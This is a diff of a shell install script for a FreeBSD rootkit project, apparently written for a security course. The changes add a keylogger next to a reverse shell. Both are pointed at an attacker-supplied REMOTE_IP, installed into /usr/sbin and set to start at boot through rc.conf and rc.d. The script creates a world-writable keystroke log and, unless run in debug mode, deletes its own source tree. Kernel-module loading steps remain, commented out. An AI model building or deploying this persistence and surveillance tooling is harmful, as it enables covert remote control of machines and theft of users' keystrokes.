@@ -1,4 +1,3 @@
-
 #!/bin/sh
 #
 # Copyright (c) 2019 Jasper Lowell
@@ -17,6 +16,8 @@
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 #
 
+REMOTE_IP=$1
+
 SRC=$(dirname "$(realpath $0)")
 
 NAME="rootkit"
@@ -24,11 +25,15 @@ KO="$NAME.ko"
 KMOD=$SRC/src/kmod
 BINARIES=$SRC/src/bin
 
-RSHELL_BIN="rshell_target"
+RSHELL="rshell_target"
 RSHELL_CONF_FILE="rshell"
-RSHELL_INSTALL="/etc/rc.d"
-RSHELL_CONF="/etc/rc.conf"
-USR_BIN="/usr/sbin"
+KEYLOG="keylog_target"
+KEYLOG_CONF_FILE="keylog"
+KEYLOG_LOG_FILE="/usr/home/comp6447/keylog_file"
+
+RC_INSTALL_LOCATION="/etc/rc.d/"
+RC_CONF_FILE="/etc/rc.conf"
+USR_SBIN="/usr/sbin/"
 
 
 INSTALL="/boot/modules"
@@ -43,35 +48,71 @@ cat << "EOF"
 
 EOF
 
-cd $KMOD
 
-echo ">> Clean existing build."
+cd $BINARIES
+
+echo ">> Clean existing binary build."
 make clean
 
-echo ">> Build rootkit."
-make
+echo ">> Compile rshell binary."
+make rshell_target
 
-echo ">> Install rootkit kernel module."
+echo ">> Compile keylog binary."
+make keylog_target
 
-echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
-touch $LOADER_CONF_TRANSPARENT
+echo ">> Creating keylog file."
+touch $KEYLOG_LOG_FILE
+chmod 666 $KEYLOG_LOG_FILE
 
-mv $KMOD/$KO $INSTALL/$KO
-kldload $INSTALL/$KO
+echo ">> Editing rshell conf file to contain REMOTE_IP=${REMOTE_IP}."
+sed -i '' "s|${USR_SBIN}${RSHELL}|${USR_SBIN}${RSHELL} ${REMOTE_IP}|g" $BINARIES/$RSHELL_CONF_FILE
 
-echo ">> Install revershell shell for boot."
-mv $BINARIES/$RSHELL_BIN $USR_BIN/
+echo ">> Editing keylog conf file to contain REMOTE_IP=${REMOTE_IP}."
+sed -i '' "s|${USR_SBIN}${KEYLOG}|${USR_SBIN}${KEYLOG} ${REMOTE_IP}|g" $BINARIES/$KEYLOG_CONF_FILE
 
-echo ">> Enable reverse-shell on boot."
-echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RSHELL_CONF
+echo ">> Moving reverse shell binary into /usr/sbin/ for booting."
+mv -f $BINARIES/$RSHELL $USR_SBIN
 
-echo ">> Move configuration file into rc."
-mv $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL/
+echo ">> Moving keylog binary into /usr/sbin/ for booting."
+mv -f $BINARIES/$KEYLOG $USR_SBIN
 
-if [ "$1" = "DEBUG" ]
+echo ">> Modify rc.conf to enable boot for rshell."
+echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RC_CONF_FILE
+
+echo ">> Modify rc.conf to enable boot for keylog."
+echo "${KEYLOG_CONF_FILE}_enable=\"YES\"" >> $RC_CONF_FILE
+
+echo ">> Move rshell configuration file into /etc/rc.d."
+mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
+
+echo ">> Move keylog configuration file into /etc/rc.d."
+mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
+
+# cd $KMOD
+
+# echo ">> Clean existing build."
+# make clean
+
+# echo ">> Build rootkit."
+# make
+
+# echo ">> Install rootkit kernel module."
+
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+# touch $LOADER_CONF_TRANSPARENT
+
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
+
+
+if [ "$2" = "DEBUG" ]
 then
         echo ">> Ignore source files."
+        git checkout $BINARIES/rshell
+        git checkout $BINARIES/keylog
 else
 	echo ">> Purge source files."
 	rm -rf $SRC
 fi
+
+
